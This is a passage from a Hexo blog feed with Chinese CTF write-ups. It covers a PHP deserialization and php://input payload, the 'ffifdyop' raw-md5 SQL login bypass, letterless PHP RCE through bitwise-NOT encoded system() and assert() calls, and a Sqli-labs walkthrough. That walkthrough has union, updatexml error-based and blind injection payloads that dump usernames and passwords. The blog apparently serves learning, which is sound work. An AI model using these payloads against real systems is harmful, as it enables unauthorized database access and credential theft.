&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?text=file=php://input&amp;amp;&amp;amp;file=useless.php&amp;amp;&amp;amp;password=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post传参:welcome to the zjct&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;检查可发现源代码注释部分有 flag&lt;/p&gt;
&lt;h3 id=&#34;7easy_md5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7easy_md5&#34;&gt;#&lt;/a&gt; 7.easy_md5&lt;/h3&gt;
&lt;p&gt;F12-&amp;gt; 网络 -&amp;gt; 请求头 -&amp;gt;hint&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM admin WHERE username = &amp;#x27;admin&amp;#x27; and password = &amp;#x27;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;md5&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;content: ffifdyop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hex: 276f722736c95d99e921722cf9ed621c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;raw: &amp;#x27;or&amp;#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;string: &amp;#x27;or&amp;#x27;6]!r,b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意:&lt;br&gt;
 &lt;code&gt;\和后面三个字符算一个字符&lt;/code&gt; &lt;br&gt;
 sql:``select * from admin where username=‘admin’ and password=’&amp;quot;‘or’6]!r,b&amp;quot;’;&lt;/p&gt;
&lt;p&gt;在 mysql 里面，在用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password=‘xxx’ or 1  ，也就相当于 password=‘xxx’ or true，所以返回值就是 true&lt;/p&gt;
&lt;p&gt;关键是:&lt;mark&gt;’ or 1’&lt;/mark&gt;&lt;br&gt;
答案肯定不止一个&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;content: 129581926211651571912466741651878684928&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hex: 06da5430449f8f6f23dfc1276f722738&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&amp;#x27;or&amp;#x27;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;string: T0Do#&amp;#x27;or&amp;#x27;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;复现:&lt;br&gt;
![[Pasted image 20230425192651.png]]&lt;/p&gt;
&lt;p&gt;然后就是常规的数组绕过，0e 绕过了&lt;/p&gt;
&lt;h3 id=&#34;8swpuctf-2021-新生赛hardrce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8swpuctf-2021-新生赛hardrce&#34;&gt;#&lt;/a&gt; 8.[SWPUCTF 2021 新生赛] hardrce&lt;/h3&gt;
&lt;h4 id=&#34;无字母rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无字母rce&#34;&gt;#&lt;/a&gt; 无字母 rce&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;system () 函数&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;执行外部程序并显示输出资料&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;eval () 函数&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;把字符串当 php 代码执行，必须以；结尾&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;php 的取反问题～&lt;br&gt;
 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;对于数字取反的规则可以看看这篇:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx&#34;&gt;https://blog.csdn.net/WilliamsWayne/article/details/78259501&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;对于字符取反，由于有大量的不可显字符，要 url 编码&lt;/li&gt;
&lt;li&gt;方法一:&lt;/li&gt;
&lt;li&gt;eg1.&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(~&amp;quot;phpinfo&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%8F%97%8F%96%91%99%90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:(~%8F%97%8F%96%91%99%90&lt;br&gt;
)();&lt;/p&gt;
&lt;p&gt;配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行&lt;br&gt;
 eg2.&lt;br&gt;
 要构造 &lt;code&gt;assert($_POST[1])&lt;/code&gt;  语句，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=urlencode(~&amp;quot;assert&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b=urlencode(~&amp;quot;_POST&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;得到&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%9E%8C%8C%9A%8D%8B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%A0%AF%B0%AC%AB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=~(%A0%AF%B0%AC%AB);   //$__=_POST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___=$$__;         //$___=$_POST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_($___[1]);      //assert($_POST[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload(写在一行):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1=phpinfo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;常见取反 url:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;system:%8C%86%8C%8B%9A%92&lt;/li&gt;
&lt;li&gt;ls /:%93%8C%DF%D0&lt;br&gt;
 &lt;code&gt;system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;cat:%9C%9E%8B&lt;/li&gt;
&lt;li&gt;cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98&lt;/li&gt;
&lt;li&gt;cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98&lt;br&gt;
 可自行运行得:&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(~&amp;quot;xxx&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;方法二:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;卢&amp;quot;.encode(&amp;quot;utf8&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\xe5\x8d\xa2&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=&amp;quot;卢&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(~($_&amp;#123;1&amp;#125;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(~&amp;quot;\x8d&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 输出rr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;$_&amp;#123;1&amp;#125;是\x8d,\x8d取反是r&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此题 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system(&amp;quot;cat /flllllaaaaaaggggggg&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;深刻学习无字母 rce 来这里&lt;/strong&gt;&lt;a href=&#34;https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/&#34;&gt;来学无参构造 rce&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2023-04-25T16:51:04.501Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/04/24/sqli-labs/</id>
        <title>Sqli-labs靶场通关</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/24/sqli-labs/"/>
        <content type="html">&lt;h3 id=&#34;怎么判断字符型或者数字型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#怎么判断字符型或者数字型&#34;&gt;#&lt;/a&gt; 怎么判断字符型或者数字型？&lt;/h3&gt;
&lt;p&gt;数字型:id=2 和 id=3-1 返回界面相同&lt;br&gt;
原理：说明 2-1 被解析了，旁边没有引号&lt;br&gt;
字符型:id=2 和 id=2a 页面一样就行&lt;br&gt;
原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&amp;gt; 数字&lt;/p&gt;
&lt;p&gt;group_concat 是用，连接多行记录的函数&lt;/p&gt;
&lt;p&gt;less1&lt;br&gt;
 字符型注入&lt;br&gt;
看源码:sql=“SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;&lt;/p&gt;
&lt;p&gt;因此:&lt;mark&gt;payload:1’   操作   --+&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;?id=1’ order by 3–+&lt;br&gt;
?id=1’ order by 4–+&lt;br&gt;
?id=-1’ union select 1,2,3–+// 判断回显位&lt;br&gt;
？id=-1’ union select 1,2,database ()–+&lt;br&gt;
?id=-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+&lt;/p&gt;
&lt;p&gt;?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ and table_schema=database()–+&lt;/p&gt;
&lt;p&gt;?id=-1’ union select 1,group_concat(username),group_concat(password) from users–+&lt;/p&gt;
&lt;p&gt;less2&lt;br&gt;
 数字型&lt;br&gt;
看源码:sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1”;&lt;br&gt;
 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可&lt;/p&gt;
&lt;p&gt;布尔盲注:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&amp;#x27;D&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less3&lt;br&gt;
id=1’)–+&lt;/p&gt;
&lt;p&gt;less4&lt;br&gt;
id=1&amp;quot;)–+&lt;/p&gt;
&lt;p&gt;less5&lt;br&gt;
 报错注入:updatexml 函数&lt;br&gt;
 updatexml (xml_doument,XPath_string,new_value)&lt;br&gt;
 第一个参数：XML 的内容&lt;br&gt;
第二个参数：是需要 update 的位置 XPATH 路径&lt;br&gt;
第三个参数：是更新后的内容&lt;br&gt;
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容&lt;br&gt;
可以校验的：0x7e (~),0x5e24 (^$),’#’(#)&lt;br&gt;
payload:&lt;br&gt;
?id=1’ and updatexml (1,concat (0x7e,database ()),1)–+ 暴当前数据库&lt;/p&gt;
&lt;p&gt;?id=1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)–+&lt;br&gt;
 此时会出现 Subquery returns more than 1 row&lt;br&gt;
1. 可以用 limit 解决，limit 0,1 1,1 2,1 3,1&lt;br&gt;
 在 limit 3,1 找到 users 表&lt;br&gt;
？id=1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=database () limit 3,1)),1)–+&lt;br&gt;
 后面同理爆字段&lt;br&gt;
 2. 加个 group_concat 解决&lt;br&gt;
？id=1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1)–+&lt;br&gt;
 过程同上&lt;br&gt;
最后&lt;br&gt;
？id=1’ and updatexml (1,concat (0x7e,(select group_concat (username) from users)),1)–+&lt;/p&gt;
&lt;p&gt;substr 方法&lt;br&gt;
’ or updatexml (1,concat (0x7e,substr ((select group_concat (schema_name) from information_schema.schemata),1,31),0x7e),1)–+&lt;br&gt;
 后面把 1,31 换成 32,31&lt;br&gt;
63,31&lt;br&gt;
94,31&lt;/p&gt;
&lt;p&gt;less6&lt;br&gt;
id=1&amp;quot; 与 less5 一样&lt;/p&gt;
&lt;p&gt;less7&lt;br&gt;
 布尔盲注&lt;br&gt;
根据页面回显试探数据，可以二分法，函数:substring (),mid (),substr ().&lt;br&gt;
eg.?id=1’ and (select mid((select concat(user,0x7e,password) from users),1,1))=’’–+&lt;br&gt;
 一直到 less10, 布尔和时间盲注直接用 sqlimap&lt;/p&gt;
&lt;p&gt;less11&lt;br&gt;
 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式&lt;br&gt;
 uname=11&amp;amp;passwd=1&amp;amp;submit=Submit&lt;br&gt;
 判断字符型&lt;br&gt;
接下来用基本的 union 注入就欧克&lt;br&gt;
 less12&lt;br&gt;
&amp;quot;) 型，联合注入&lt;br&gt;
 less13&lt;br&gt;
)’ # 加上报错注入&lt;br&gt;
 less14&lt;br&gt;
“# 加上报错注入&lt;br&gt;
 less15&lt;br&gt;
 不显示报错信息只能盲注&lt;br&gt;
单引号字符型的布尔盲注:&lt;br&gt;
1’ --+&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=&#34;&gt; 用脚本 less15.py&lt;/span&gt;&lt;br&gt;
 用法:&lt;br&gt;
from less15 import *&lt;br&gt;
Database15()&lt;br&gt;
Tables15()&lt;br&gt;
 Columns15 (‘库’,‘表’)&lt;br&gt;
 Content15 (‘库’,‘表’,‘字段’,‘字段’)&lt;br&gt;
less16&lt;br&gt;
 双引号字符型加括号的盲注&lt;br&gt;
 1”) --+&lt;br&gt;
 脚本:less16.py&lt;/p&gt;
&lt;p&gt;less17&lt;br&gt;
1. 注入点在 password 栏里，单引号字符加报错注入&lt;br&gt;
 2. 先抓包，copy to file, 用 sqlmap 工具&lt;br&gt;
 python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -r 路径&lt;/p&gt;
&lt;p&gt;less18&lt;br&gt;
 注入点在 user-agent, 且用户名密码必须正确&lt;br&gt;
注意：闭合之前的部分必须为空，很恶心&lt;br&gt;
’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’&lt;/p&gt;
&lt;p&gt;最后:&lt;br&gt;
’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’&lt;/p&gt;
&lt;p&gt;less19&lt;br&gt;
 与 18 一样，注入点在 referer&lt;/p&gt;
&lt;p&gt;less20&lt;br&gt;
 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie&lt;/p&gt;
</content>
        <updated>2023-04-23T16:32:55.178Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/04/23/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/23/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
